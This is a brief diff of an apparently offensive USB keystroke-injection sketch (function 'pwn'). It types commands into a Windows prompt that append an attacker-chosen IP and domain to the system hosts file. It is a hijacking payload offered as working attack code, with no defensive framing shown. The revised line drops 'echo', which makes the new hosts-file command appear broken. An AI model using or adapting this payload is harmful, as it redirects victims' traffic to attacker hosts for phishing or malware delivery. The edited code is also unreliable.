@@ -49,9 +49,10 @@ void pwn()
  delay(500);
  key(KEY_ENTER, 0);
  delay(1100);
- Keyboard.println("cd c:/Windows/System32/drivers/etc");
- Keyboard.println("echo. >> hosts");
- Keyboard.println("echo IPDLVR LINKDLVR >> c:/Windows/System32/drivers/etc/hosts");
+ Keyboard.println("cd C:/Windows/System32/drivers/etc/");
+ delay(150);
+ Keyboard.println("IPDLVR LINKDLVR>>hosts");
+ delay(150);
  Keyboard.println("exit");
 
 }
